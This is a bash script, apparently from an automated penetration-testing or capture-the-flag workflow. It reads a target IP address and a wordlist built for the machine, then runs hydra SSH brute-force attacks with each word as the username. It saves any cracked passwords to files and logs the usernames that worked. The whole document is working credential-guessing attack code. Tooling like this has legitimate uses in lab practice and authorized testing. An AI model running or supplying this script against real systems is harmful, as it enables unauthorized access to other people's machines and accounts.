#!/bin/bash
path=$(cat path)
cd $path
IP_address=$(cat IP_address)
machine=$(cat machine)
ssh_true=$(grep -c "ssh" scan_nmap_"$machine"_grep)

###############################################################
#Testing brutforce for potential users
IFS=$'\n' read -rd '' -a wordlists_array <<< $(cat wordlists_$machine)
tr ' ' '\n' < wordlists_$machine > vertical_wordlists_$machine
for potential_usr in ${wordlists_array[@]}
do
	timeout 5m hydra -l $potential_usr -P vertical_wordlists_$machine $IP_address ssh > tmp_hydra
	grep "password" tmp_hydra | grep -oP 'password: \K\S+' > password_$potential_usr
	exist=$(cat password_$potential_usr | wc -l)
	if [ $exist -gt 0 ]
	then
		cat password_$potential_usr
		echo $potential_usr >> ssh_users
	else
		rm password_$potential_usr
	fi
done
###############################################################
